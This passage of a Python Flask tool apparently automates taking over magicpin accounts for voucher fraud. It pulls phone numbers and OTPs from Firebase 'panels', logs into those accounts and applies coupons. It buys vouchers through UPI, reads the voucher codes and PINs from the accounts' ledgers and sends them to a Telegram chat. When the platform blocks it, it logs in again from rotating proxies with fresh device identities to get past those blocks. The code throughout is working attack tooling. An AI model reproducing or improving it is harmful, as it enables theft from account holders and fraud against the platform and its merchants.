            "parent": parent, "paymentMode": "UPI", "paymentInstrument": "UPI",
            "instrumentTitle": f"UPI-{instrument}", "pgCouponCode": False,
            "instrumentId": instrument, "userType": "CUSTOMER",
            "phoneNo": phone, "emailId": email,
            "magicCashSelected": False, "magicCashAmount": mp_amt}
    cookies = cookie_header or f"rzp_unified_session_id={nonce(12)}"
    h = _pg_headers(txn, extra_cookies=cookies)
    info(f"/pg/payment/initiate -> {parent}/{instrument} (mp_amt={mp_amt})")
    try:
        r = sess.post(PAY_INITIATE, headers=h, json=body, timeout=30)
    except Exception as e:
        warn(f"initiate req err: {e}")
        return None, str(e)
    info(f"HTTP {r.status_code}")
    raw = r.text[:600] if r.text else ""
    if r.status_code != 200:
        warn(f"initiate raw: {raw}")
        return None, f"HTTP {r.status_code}: {raw}"
    try:
        d = r.json()
    except Exception:
        warn(f"initiate non-json raw: {raw}")
        return None, f"non-json: {raw}"
    status = str(d.get("status") or d.get("Status") or "").upper()
    uri = d.get("upiUri") or d.get("upi_uri") or d.get("uri") or ""
    if uri and not uri.startswith("upi://"):
        uri = "upi://pay?" + uri.lstrip("?")
    if status == "SUCCESS" and uri:
        ok(f"status : {status}")
        ok(f"upiUri : {uri}")
        return uri, None
    warn(f"initiate FAILURE raw: {raw}")
    msg = d.get("message") or d.get("error") or d.get("errorMessage") or raw[:200]
    return None, f"{status or 'FAILURE'}: {msg}"

def try_initiate_all(txn, uid, phone, email, amount, voucher: dict,
                     session, cookie_header=None):
    _prime_startpayment_page(txn, session, cookie_header)
    fresh_cookies = _cookies_to_header(session.cookies) or cookie_header
    last_err = None
    for inst, parent in UPI_TRIES:
        uri, e = initiate_upi(txn, uid, phone, email, amount, voucher,
                              instrument=inst, parent=parent,
                              session=session, cookie_header=fresh_cookies)
        if uri:
            return uri, inst, None
        last_err = e
        time.sleep(0.6)
        fresh_cookies = _cookies_to_header(session.cookies) or fresh_cookies
    return None, None, last_err

def make_qr_png(uri, path="upi_qr.png"):
    try:
        import qrcode
        qr = qrcode.QRCode(border=2, box_size=10)
        qr.add_data(uri); qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(path); return True
    except Exception as e:
        warn(f"qr: {e}"); return False

# ═══════════════════ LEDGER ═══════════════════
def _ledger_call(token, uid, next_cursor="0", filter_val="",
                 page_source=None, session=None):
    sess = session or SESSION
    params = {"next": str(next_cursor), "filter": filter_val}
    if page_source: params["pageSource"] = page_source
    else:
        params["is_helpdesk_item_selection_page"] = "false"
        params["client"] = ""
    h = _ledger_headers(token, uid)
    try:
        r = sess.get(LEDGER_URL, headers=h, params=params, timeout=25)
        if r.status_code not in (200, 304): return None
        if r.status_code == 304 or not r.text.strip(): return {}
        return r.json()
    except Exception as e:
        warn(f"ledger: {e}"); return None

def _walk_cards(o, out):
    if isinstance(o, dict):
        if o.get("type") == "transaction-info-card": out.append(o)
        for v in o.values(): _walk_cards(v, out)
    elif isinstance(o, list):
        for i in o: _walk_cards(i, out)

def ledger_all_voucher_cards(token, uid, max_pages=LEDGER_MAX_PAGES, session=None):
    all_cards = []
    d = _ledger_call(token, uid, next_cursor="0", filter_val="",
                     page_source="account", session=session)
    if d:
        cards = []; _walk_cards(d.get("data") or [], cards)
        all_cards += cards; cursor = d.get("next")
    else: cursor = "1"
    page = 1
    while cursor and page <= max_pages:
        d = _ledger_call(token, uid, next_cursor=str(page), filter_val="", session=session)
        if not d: break
        cards = []; _walk_cards(d.get("data") or [], cards)
        all_cards += cards; cursor = d.get("next"); page += 1
        if not cursor: break
    return all_cards

def ledger_all_bought_txns(token, uid, session=None, min_age_ms=0,
                           max_pages=LEDGER_MAX_PAGES):
    cards = ledger_all_voucher_cards(token, uid, max_pages=max_pages, session=session)
    out, seen = [], set()
    now_ms = int(time.time()*1000)
    for c in cards:
        if c.get("txn_status") != "BOUGHT": continue
        try: tid = int(c.get("transaction_id"))
        except: continue
        if tid in seen: continue
        seen.add(tid)
        created = c.get("CreatedAt") or 0
        if min_age_ms and created and (now_ms - created) > min_age_ms:
            continue
        out.append({
            "numeric": tid,
            "created_at": created,
            "merchant": (c.get("title") or {}).get("value") or "",
            "value": (c.get("sub_title") or {}).get("value") or "",
        })
    out.sort(key=lambda x: x["created_at"], reverse=True)
    return out

def ledger_newest_voucher_txn(token, uid, min_txn_id=0, max_pages=LEDGER_MAX_PAGES,
                              session=None):
    txns = ledger_all_bought_txns(token, uid, session=session, max_pages=max_pages)
    for t in txns:
        if t["numeric"] > int(min_txn_id):
            return t["numeric"], None
    return None, None

# ═══════════════════ VOUCHER EXTRACT ═══════════════════
def _extract_voucher(v, pg_txn=None):
    merchant = value = code = pin = None
    def walk(o):
        nonlocal merchant, value, code, pin
        if isinstance(o, dict):
            t = o.get("type")
            if t == "voucher-details-widget":
                md = o.get("merchant_details") or {}
                merchant = (md.get("title") or {}).get("value") or merchant
            elif t == "voucher-header-widget":
                tv = (o.get("title") or {}).get("value")
                if tv and not value: value = tv
            elif t == "voucher-code-widget":
                code = (o.get("title") or {}).get("value") or code
                pin = (o.get("sub_title") or {}).get("value") or pin
            for v2 in o.values(): walk(v2)
        elif isinstance(o, list):
            for i in o: walk(i)
    walk(v)
    return merchant, value, code, pin

def fetch_voucher_by_numeric(numeric, token, uid, pg_txn=None, session=None):
    sess = session or SESSION
    url = f"https://webapi.magicpin.in/txns/post-txn/voucher/{numeric}"
    info(f"GET {url}")
    try:
        r = sess.get(url, headers=_api_headers(token, uid), timeout=25)
    except Exception as e:
        warn(f"fetch err: {e}")
        return {"merchant": None, "value": None, "code": None,
                "pin": None, "numeric": numeric, "pg_txn": pg_txn}
    info(f"HTTP {r.status_code} len={len(r.text)}")
    if r.status_code != 200 or not r.text.strip():
        warn(f"raw: {r.text[:300]}")
        return {"merchant": None, "value": None, "code": None,
                "pin": None, "numeric": numeric, "pg_txn": pg_txn}
    try: v = r.json()
    except:
        warn("NOT JSON")
        return {"merchant": None, "value": None, "code": None,
                "pin": None, "numeric": numeric, "pg_txn": pg_txn}
    merchant, value, code, pin = _extract_voucher(v, pg_txn)
    return {"merchant": merchant, "value": value, "code": code,
            "pin": pin, "numeric": numeric, "pg_txn": pg_txn}

def fetch_voucher_with_retry(numeric, token, uid, pg_txn=None, session=None):
    last = None
    for attempt in range(1, VOUCHER_CODE_RETRIES + 1):
        last = fetch_voucher_by_numeric(numeric, token, uid,
                                        pg_txn=pg_txn, session=session)
        if last and last.get("code"):
            return last
        if attempt < VOUCHER_CODE_RETRIES:
            info(f"code missing (try {attempt}/{VOUCHER_CODE_RETRIES}) — wait {VOUCHER_CODE_GAP}s")
            time.sleep(VOUCHER_CODE_GAP)
    return last

def _send_voucher_tg(res, phone, txn):
    if res.get("code"):
        banner("VOUCHER RECEIVED")
        ok(f"Merchant : {res['merchant']}")
        ok(f"Value    : {res['value']}")
        ok(f"Code     : {res['code']}")
        ok(f"Pin      : {res['pin']}")
        ok(f"PG Txn   : {txn or res['numeric']}")
        tg_send(
            "🎟️ <b>VOUCHER RECEIVED</b>\n\n"
            f"📱 Phone    : <code>{phone}</code>\n"
            f"🧾 PG Txn   : <code>{txn or res['numeric']}</code>\n"
            f"🏬 Merchant : <b>{res['merchant'] or '-'}</b>\n"
            f"💰 Value    : <b>{res['value'] or '-'}</b>\n"
            f"🔑 Code     : <code>{res['code']}</code>\n"
            f"🔒 Pin      : <code>{res['pin'] or '-'}</code>")
    else:
        warn(f"code missing — refetch needed")
        tg_send(
            "⚠️ <b>Voucher code missing</b>\n\n"
            f"📱 Phone   : <code>{phone}</code>\n"
            f"🧾 Numeric : <code>{res.get('numeric') or '-'}</code>\n"
            f"🏬 Merchant: <b>{res.get('merchant') or '-'}</b>\n"
            "🔁 Use Refetch button in UI")

# ═══════════════════ DIRECT LEDGER FETCH ═══════════════════
def fetch_from_ledger_job(jid):
    with JOBS_LOCK:
        j = JOBS.get(jid)
    if not j: return
    phone = j["phone"]; token = j.get("token"); uid = j.get("uid")
    txn = j.get("txn")
    if not (token and uid):
        _set(jid, status="voucher_failed", error="no session", finished=True); return

    if j.get("voucher_code"):
        info(f"[LEDGER-SKIP] {jid} already has code")
        return

    _set(jid, status="voucher_poll", poll_started_at=time.time(),
         poll_tries=0, error=None)
    _log(jid, "ledger: fetching transactions…")
    info(f"[LEDGER-START] {jid}")
    tg_send(f"📒 <b>Fetching from Transactions</b>\n📱 <code>{phone}</code>")

    sess = ProxySession(get_proxy_for_phone(phone)) if PROXY_ENABLED else SESSION

    try:
        txns = ledger_all_bought_txns(token, uid, session=sess,
                                       max_pages=LEDGER_MAX_PAGES)
    except Exception as e:
        warn(f"[{jid}] ledger fetch err: {e}")
        txns = []

    _log(jid, f"ledger: {len(txns)} BOUGHT txns")
    info(f"[LEDGER] {jid} — {len(txns)} BOUGHT txns")

    if not txns:
        _set(jid, status="voucher_code_missing", finished=True,
             voucher=None, voucher_code=None,
             error="no BOUGHT txn in ledger")
        _log(jid, "ledger: 0 BOUGHT txns — refetch needed")
        tg_send(f"⚠️ <b>No transactions found</b>\n📱 <code>{phone}</code>\n"
                f"🔁 Refetch button dabao")
        info(f"[LEDGER-END] {jid}")
        return

    tried = 0
    for i, t in enumerate(txns[:5], 1):
        numeric = t["numeric"]
        tried = i
        _log(jid, f"ledger: trying #{numeric} ({t['merchant']} {t['value']})")
        info(f"[LEDGER-TRY {i}] {jid} numeric={numeric}")

        res = fetch_voucher_with_retry(numeric, token, uid,
                                       pg_txn=txn, session=sess)
        if res and res.get("code"):
            _set(jid, status="voucher_done",
                 voucher=res["numeric"],
                 voucher_code=res["code"], voucher_pin=res["pin"],
                 voucher_merchant=res["merchant"],
                 voucher_value=res["value"], finished=True, error=None)
            _log(jid, f"VOUCHER ✓ {res['code']} / {res['pin']}")
            _send_voucher_tg(res, phone, txn)
            info(f"[LEDGER-END] {jid}")
            return
        else:
            _log(jid, f"ledger: #{numeric} code missing, next…")

    _set(jid, status="voucher_code_missing", finished=True,
         voucher=txns[0]["numeric"],
         voucher_code=None, voucher_pin=None,
         voucher_merchant=txns[0]["merchant"],
         voucher_value=txns[0]["value"],
         error=f"checked {tried} txns — no code")
    _log(jid, f"ledger: all {tried} txns failed")
    tg_send(f"⚠️ <b>Code missing in all txns</b>\n📱 <code>{phone}</code>\n"
            f"🔁 Refetch button dabao")
    info(f"[LEDGER-END] {jid}")

# ═══════════════════ STATE ═══════════════════
JOBS = {}
JOBS_LOCK = threading.Lock()
STATE = {
    "panels": [], "current_panel": -1,
    "workers": PARALLEL_WORKERS,
    "log_lines": [],
    "selected_voucher": DEFAULT_VOUCHER,
    "voucher_locked": False,
}
STATE_LOCK = threading.Lock()

def state_log(msg):
    print(msg, flush=True)
    with STATE_LOCK:
        STATE["log_lines"].append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        STATE["log_lines"] = STATE["log_lines"][-100:]

def _log(jid, msg):
    with JOBS_LOCK:
        if jid in JOBS:
            JOBS[jid]["log"].append(f"[{time.strftime('%H:%M:%S')}] {msg}")
            JOBS[jid]["log"] = JOBS[jid]["log"][-60:]

def _set(jid, **kw):
    with JOBS_LOCK:
        if jid in JOBS: JOBS[jid].update(kw)

def _new_job(phone, fb_url, client_id, panel_idx, voucher_key):
    jid = f"{phone}_{int(time.time()*1000)}_{random.randint(100,999)}"
    v = VOUCHERS[voucher_key]
    with JOBS_LOCK:
        JOBS[jid] = {
            "job_id": jid, "phone": phone, "status": "queued", "log": [],
            "qr": None, "upi": None,
            "voucher": None, "voucher_code": None, "voucher_pin": None,
            "voucher_merchant": None, "voucher_value": None,
            "verdict": None, "txn": None, "amount": None,
            "fb_url": fb_url, "client_id": client_id, "panel_idx": panel_idx,
            "voucher_key": voucher_key,
            "voucher_name": v["name"],
            "voucher_icon": v["icon"],
            "voucher_face_value": v["face_value"],
            "voucher_pg_amount": v["pg_amount"],
            "voucher_magicpin_amount": v["magicpin_amount"],
            "error": None, "step": "queued",
            "send_otp": None, "otp": None, "login": None,
            "coupon": None, "pg_amount": None, "payout": None,
            "qr_ready": False, "finished": False,
            "poll_started_at": None, "poll_tries": 0, "poll_stop": False,
            "refetching": False,
            "token": None, "uid": None, "base_txn_id": 0,
            "relogins": 0,
        }
    return jid

# ═══════════════════ RUN ONE ═══════════════════
def run_one_sync(jid):
    try:
        with JOBS_LOCK:
            j = JOBS.get(jid)
        if not j: return
        phone = normalize_phone(j["phone"])
        fb_url = j["fb_url"]; client_id = j["client_id"]
        voucher = VOUCHERS[j["voucher_key"]]

        pg_amt = None
        txn = None; uri = None; qr_path = None
        full_phone = phone; token = None; uid = None
        device = None; sess = None
        cookie_header = None

        for round_no in range(1, MAX_RELOGINS + 1):
            tag = f"[r{round_no}]" if round_no > 1 else ""
            _set(jid, status="running", step="send_otp", relogins=round_no-1)
            _log(jid, f"{tag} start → {phone} | {voucher['name']}")

            code, detail, sess, device = send_otp_with_retry(
                phone, jid=jid, relogin_round=round_no
            )
            _log(jid, f"{tag} SendOtp [{code}] {detail}")
            _set(jid, send_otp=code)
            if code != "OK":
                _set(jid, status="otp_send_failed", step="failed", error=detail)
                return

            h = base_headers()
            send_ts = int(time.time() * 1000)

            _set(jid, step="otp_wait")
            otp = _fetch_otp_from_panel(fb_url, client_id, send_ts, phone)
            if not otp:
                _set(jid, status="no_otp_from_fb", step="failed",
                     error=f"no OTP in {OTP_POLL_TIMEOUT}s"); return
            _log(jid, f"{tag} OTP = {otp}")
            _set(jid, otp=otp, step="login")
            _mark_otp_used(phone, otp)

            d = login(phone, otp, h, device=device, session=sess)
            if not d:
                _set(jid, status="login_failed", step="failed", login="FAIL"); return
            verdict = _classify_user(d)
            _set(jid, verdict=verdict, login="OK")
            _log(jid, f"{tag} verdict = {verdict}")

            token = d.get("access_token")
            uid = str(d.get("user_id"))
            full_phone = d.get("phone_number") or phone
            _set(jid, token=token, uid=uid)

            try:
                base, _ = ledger_newest_voucher_txn(token, uid, min_txn_id=0, session=sess)
                if base is None: base = 0
            except Exception:
                base = 0
            _set(jid, base_txn_id=base)

            _set(jid, step="checkout")
            _log(jid, f"{tag} checkout 5-try → {verdict} | {voucher['name']}")
            pg_amt, c_status, c_msg, blocked = checkout(
                full_phone, token, uid, voucher,
                device=device, session=sess
            )

            if blocked:
                if round_no < MAX_RELOGINS:
                    wait = random.randint(5, 10)
                    _log(jid, f"{tag} BLOCKED — relogin #{round_no+1} after {wait}s")
                    warn(f"{tag} BLOCKED → relogin #{round_no+1} (fresh device+IP)")
                    time.sleep(wait)
                    continue
                else:
                    _set(jid, status="blocked_persistent", step="done",
                         finished=True, error=f"blocked after {MAX_RELOGINS} relogins")
                    _log(jid, f"{tag} blocked after {MAX_RELOGINS} relogins — skip")
                    return

            if pg_amt is None or pg_amt > voucher["pg_amount"] + 0.5:
                _set(jid, status="coupon_failed", step="done", finished=True,
                     coupon="FAIL", pg_amount=pg_amt,
                     error=f"pgAmt={pg_amt} (expected ≤{voucher['pg_amount']})")
                _log(jid, f"{tag} coupon nahi laga — pgAmt={pg_amt} — SKIP")
                return

            _set(jid, coupon=f"SUCCESS - ₹{pg_amt}", pg_amount=pg_amt)
            _log(jid, f"{tag} coupon OK, amount = {pg_amt}")
            break

        _set(jid, step="payout")
        txn, pay_err, cookie_header = payoutapp(
            full_phone, token, uid, pg_amt, voucher,
            device=device, session=sess)
        if not txn:
            _set(jid, status="payoutapp_failed", step="failed",
                 finished=True, error=pay_err or "unknown")
            _log(jid, f"payout fail: {pay_err}"); return
        _set(jid, txn=txn, payout=txn)
        _log(jid, f"txn = {txn}")

        _set(jid, step="upi")
        uri, used_inst, last_err = try_initiate_all(
            txn, uid, full_phone, EMAIL, amount=pg_amt, voucher=voucher,
            session=sess, cookie_header=cookie_header)
        if not uri:
            _set(jid, status="upi_failed", step="failed", finished=True,
                 error=f"all instruments failed: {last_err}")
            _log(jid, f"UPI FAIL all instruments: {last_err}")
            return
        _log(jid, f"UPI OK via {used_inst}")
        qr_path = f"qr_{jid}.png"
        make_qr_png(uri, qr_path)
        _set(jid, qr=qr_path, upi=uri, status="qr_ready", step="done",
             amount=pg_amt, qr_ready=True, finished=True, txn=txn)
        _log(jid, "QR ready")

    except Exception as e:
        print(traceback.format_exc())
        _log(jid, f"ERROR: {e}")
        _set(jid, status="error", step="failed",
             error=str(e)[:200], finished=True)

# ═══════════════════ ASYNC PANEL RUNNER ═══════════════════
async def run_panel_async(panel_idx):
    state_log(f"═══ PANEL [{panel_idx+1}] start")
    with STATE_LOCK:
        if panel_idx >= len(STATE["panels"]): return
        panel = STATE["panels"][panel_idx]
        if panel["status"] not in ("pending", "ready"): return
        panel["status"] = "extracting"
        workers = STATE["workers"]
        fb_url = panel["url"]
        voucher_key = STATE["selected_voucher"]
        voucher = VOUCHERS[voucher_key]
        panel["voucher_key"] = voucher_key
        panel["voucher_name"] = voucher["name"]

    state_log(f"panel {panel_idx+1}: {fb_url} | voucher={voucher['name']}")
    tg_send(f"▶️ <b>Panel {panel_idx+1}</b>\n"
            f"Voucher: <b>{voucher['name']}</b>\n"
            f"<code>{fb_url}</code>")

    clients = []
    try:
        state_log(f"panel {panel_idx+1}: extracting…")
        clients = await asyncio.to_thread(extract_phones_and_clients, fb_url)
        state_log(f"panel {panel_idx+1}: {len(clients)} clients")
    except Exception as e:
        state_log(f"panel {panel_idx+1}: extract FAIL: {e}")

    if not clients:
        with STATE_LOCK:
            panel["status"] = "no_numbers"; panel["total"] = 0
            panel["done"] = 0; panel["job_ids"] = []
        state_log(f"panel {panel_idx+1}: no_numbers")
        tg_send(f"⚠️ Panel {panel_idx+1} — koi online nahi")
        return

    jids = [_new_job(c["phone"], fb_url, c["client_id"], panel_idx, voucher_key)
            for c in clients]
    state_log(f"panel {panel_idx+1}: {len(jids)} jobs")

    with STATE_LOCK:
        panel["status"] = "running"; panel["total"] = len(jids)
        panel["done"] = 0; panel["job_ids"] = jids

    sem = asyncio.Semaphore(workers)

    async def wrapper(j):
        async with sem:
            await asyncio.to_thread(run_one_sync, j)
            with STATE_LOCK:
                panel["done"] = panel.get("done", 0) + 1

    tasks = [wrapper(jid) for jid in jids]
    await asyncio.gather(*tasks, return_exceptions=True)

    done_count = sum(1 for jid in jids if JOBS.get(jid, {}).get("finished"))
    with STATE_LOCK:
        panel["done"] = done_count
        panel["status"] = "completed"
    state_log(f"panel {panel_idx+1}: done ({done_count}/{len(jids)})")
    tg_send(f"✅ Panel {panel_idx+1} done ({done_count}/{len(jids)})")

def run_panel_in_thread(panel_idx):
    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_panel_async(panel_idx))
    finally:
        loop.close()

def _panel_has_pending(panel):
    with JOBS_LOCK:
        for jid in panel.get("job_ids", []):
            jj = JOBS.get(jid)
            if jj and not jj.get("finished"):
                return True
    return False

def next_panel():
    with STATE_LOCK:
        cur = STATE["current_panel"]
        skip_check = False
        if cur >= 0:
            cp = STATE["panels"][cur]
            if cp.get("status") in ("no_numbers", "skipped", "completed"):
                skip_check = True
        if cur >= 0 and not skip_check:
            panel = STATE["panels"][cur]
            if _panel_has_pending(panel):
                return {"error": "abhi numbers chal rahe hain"}
        nxt = cur + 1
        if nxt >= len(STATE["panels"]):
            return {"error": "aakhri panel ho gaya"}
        STATE["current_panel"] = nxt
        STATE["panels"][nxt]["status"] = "ready"
        STATE["voucher_locked"] = False
    threading.Thread(target=run_panel_in_thread, args=(nxt,), daemon=True).start()
    return {"ok": True, "panel": nxt, "needs_voucher": True}

def skip_panel():
    with STATE_LOCK:
        cur = STATE["current_panel"]
        if cur >= 0: STATE["panels"][cur]["status"] = "skipped"
        nxt = cur + 1
        if nxt >= len(STATE["panels"]):
            return {"error": "aakhri panel ho gaya"}
        STATE["current_panel"] = nxt
        STATE["panels"][nxt]["status"] = "ready"
        STATE["voucher_locked"] = False
    threading.Thread(target=run_panel_in_thread, args=(nxt,), daemon=True).start()
    return {"ok": True, "panel": nxt, "needs_voucher": True}

# ═══════════════════ FLASK ═══════════════════
app = Flask(__name__, static_folder=".")
CORS(app)

@app.route("/")
def root(): return send_from_directory(".", "index.html")

@app.route("/qr_<jid>.png")
def qr_file(jid): return send_from_directory(".", f"qr_{jid}.png")

@app.route("/api/vouchers")
def api_vouchers():
    out = []
    for k, v in VOUCHERS.items():
        out.append({
            "key": k, "name": v["name"], "icon": v["icon"],
            "face_value": v["face_value"], "pg_amount": v["pg_amount"],
            "magicpin_amount": v["magicpin_amount"],
            "merchant_id": v["merchant_id"], "voucher_id": v["voucher_id"],
            "coupon": v["coupon"],
        })
    with STATE_LOCK:
        sel = STATE["selected_voucher"]
        locked = STATE["voucher_locked"]
    return jsonify({"vouchers": out, "selected": sel, "locked": locked})

@app.route("/api/select_voucher", methods=["POST"])
def api_select_voucher():
    data = request.get_json(force=True)
    key = data.get("voucher_key", "")
    if key not in VOUCHERS:
        return jsonify({"error": "bad voucher"}), 400
    with STATE_LOCK:
        if STATE["voucher_locked"]:
            return jsonify({"error": "voucher locked (panel running)"}), 400
        STATE["selected_voucher"] = key
    return jsonify({"ok": True, "selected": key})

@app.route("/api/setup", methods=["POST"])
def api_setup():
    data = request.get_json(force=True)
    raw = data.get("firebases", "")
    workers = int(data.get("workers", PARALLEL_WORKERS))
    voucher_key = data.get("voucher_key", DEFAULT_VOUCHER)
    if voucher_key not in VOUCHERS:
        voucher_key = DEFAULT_VOUCHER
    lines = re.split(r"[\n,]+", raw)
    urls, seen = [], set()
    for line in lines:
        line = line.split("#", 1)[0].strip()
        if not line: continue
        url = parse_panel_link(line)
        if url and url not in seen:
            seen.add(url); urls.append(url)
    if not urls: return jsonify({"error": "no valid urls"}), 400
    with STATE_LOCK:
        STATE["panels"] = [{"url": u, "status": "pending", "total": 0,
                            "done": 0, "job_ids": []} for u in urls]
        STATE["current_panel"] = -1
        STATE["workers"] = workers
        STATE["log_lines"] = []
        STATE["selected_voucher"] = voucher_key
        STATE["voucher_locked"] = True
    with JOBS_LOCK: JOBS.clear()
    state_log(f"setup: {len(urls)} panels, {workers} workers, "
              f"voucher={VOUCHERS[voucher_key]['name']}")
    return jsonify({"ok": True, "total": len(urls), "workers": workers,
                    "voucher": voucher_key})

@app.route("/api/start_first", methods=["POST"])
def api_start_first():
    with STATE_LOCK:
        if not STATE["panels"]: return jsonify({"error": "setup first"}), 400
        STATE["current_panel"] = 0
        STATE["panels"][0]["status"] = "ready"
        STATE["voucher_locked"] = True
    threading.Thread(target=run_panel_in_thread, args=(0,), daemon=True).start()
    return jsonify({"ok": True})

@app.route("/api/next_panel", methods=["POST"])
def api_next_panel(): return jsonify(next_panel())

@app.route("/api/skip_panel", methods=["POST"])
def api_skip_panel(): return jsonify(skip_panel())

@app.route("/api/mark_paid", methods=["POST"])
def api_mark_paid():
    data = request.get_json(force=True)
    jid = data.get("job_id")
    if not jid or jid not in JOBS: return jsonify({"error": "bad job"}), 400
    j = JOBS[jid]
    if not j.get("token") or not j.get("uid"):
        return jsonify({"error": "no session"}), 400
    if j.get("voucher_code"):
        return jsonify({"ok": True, "already": True})
    if j.get("status") == "voucher_poll":
        return jsonify({"ok": True, "already": True})
    threading.Thread(target=fetch_from_ledger_job, args=(jid,), daemon=True).start()
    return jsonify({"ok": True})

@app.route("/api/refetch_job", methods=["POST"])
def api_refetch_job():
    data = request.get_json(force=True)
    jid = data.get("job_id")
    if not jid or jid not in JOBS:
        return jsonify({"error": "bad job"}), 400
    j = JOBS[jid]
    if not j.get("token") or not j.get("uid"):
        return jsonify({"error": "no session"}), 400
    if j.get("voucher_code"):
        return jsonify({"ok": True, "already": True,
                        "code": j.get("voucher_code")})
    if j.get("status") == "voucher_poll":
        return jsonify({"ok": True, "already": True})
    threading.Thread(target=fetch_from_ledger_job, args=(jid,), daemon=True).start()
    return jsonify({"ok": True})

@app.route("/api/update_job", methods=["POST"])
def api_update_job():
    data = request.get_json(force=True) or {}
    jid = data.pop("job_id", None)
    if not jid or jid not in JOBS:
        return jsonify({"error": "bad job"}), 400
    with JOBS_LOCK:
        JOBS[jid].update(data)
        JOBS[jid].setdefault("log", []).append(
            f"[{time.strftime('%H:%M:%S')}] recapture: "
            + ", ".join(f"{k}={v}" for k, v in data.items() if k != "log"))
        JOBS[jid]["log"] = JOBS[jid]["log"][-60:]
    return jsonify({"ok": True})

@app.route("/api/status")
def api_status():
    ids = request.args.get("ids", "")
    id_list = [i for i in ids.split(",") if i] if ids else None
    with JOBS_LOCK:
        jobs_out = {i: JOBS[i] for i in id_list if i in JOBS} if id_list else dict(JOBS)
    for j in jobs_out.values(): j["log"] = j.get("log", [])[-20:]
    with STATE_LOCK:
        panels_out = [{"idx": i, "url": p["url"], "status": p["status"],
                       "total": p.get("total", 0), "done": p.get("done", 0),
                       "job_ids": p.get("job_ids", []),
                       "voucher_key": p.get("voucher_key"),
                       "voucher_name": p.get("voucher_name")}
                      for i, p in enumerate(STATE["panels"])]
        state_out = {"current_panel": STATE["current_panel"],
                     "total_panels": len(STATE["panels"]),
                     "workers": STATE["workers"],
                     "selected_voucher": STATE["selected_voucher"],
                     "voucher_locked": STATE["voucher_locked"],
                     "panels": panels_out,
                     "log_lines": STATE["log_lines"][-30:]}
    return jsonify({"jobs": jobs_out, "state": state_out})

# ═══════════════════ MAIN ═══════════════════
if __name__ == "__main__":
    print(f"{C.GRN}{C.BOLD}")
    print("╔══════════════════════════════════════════════════════╗")
    print("║  ✨ MAGICPIN — FINAL v13 (ROTATING PROXY + DIRECT FB)║")
    print("╚══════════════════════════════════════════════════════╝")
    print(f"{C.RESET}")
    print(f"  UI       : http://localhost:5001")
    print(f"  TG       : {TG_CHAT}")
    print(f"  Proxy    : {'ON (arealproxy rotating IN)' if PROXY_ENABLED else 'OFF'}")
    print(f"  Firebase : DIRECT (no proxy)")
    print(f"  Workers  : {PARALLEL_WORKERS}")
    print(f"  Vouchers : {len(VOUCHERS)}")
    print(f"  Paid     : DIRECT ledger fetch")
    print(f"  Ledger   : top 5 BOUGHT txns tried")
    print(f"  Vch Retry: {VOUCHER_CODE_RETRIES} x {VOUCHER_CODE_GAP}s")
    print()
    app.run(host="0.0.0.0", port=5001, threaded=True)
